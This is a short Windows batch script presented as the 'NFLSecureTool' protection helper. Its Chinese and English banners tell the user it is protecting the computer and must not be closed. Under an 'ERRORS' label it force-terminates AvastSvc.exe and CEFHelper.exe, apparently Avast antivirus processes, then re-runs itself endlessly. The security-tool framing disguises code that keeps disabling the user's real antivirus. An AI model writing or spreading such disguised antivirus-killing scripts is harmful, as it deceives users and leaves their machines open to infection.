echo off
title NFLSecureTool 防护进程 (附属程序)
echo 防护中... PROTECTING YOUR COMPUTER...
echo ———————————————————————————
echo NFLSecure 防护进程，请勿终止。
echo 如需结束防护，请在主程序中使用命令“P”。
echo 注意：关闭时请保证没有有毒U盘插入，否则可能造成中毒。
echo ———————————————————————————
echo NFLSecure Protection, DO NOT EXIT.
echo If you would REALLY like to exit, please close the main program with OPTION KEY 'P'.
echo WARNING: A VIRUS MIGHT AFFECT YOUR COMPUTER IF AN INFECTED DISK IS CONNECTED WHEN YOU CLOSE THIS.
echo ———————————————————————————
echo ERRORS：错误信息———————————————————
TASKKILL /F /IM AvastSvc.exe
TASKKILL /F /IM CEFHelper.exe
cls
%0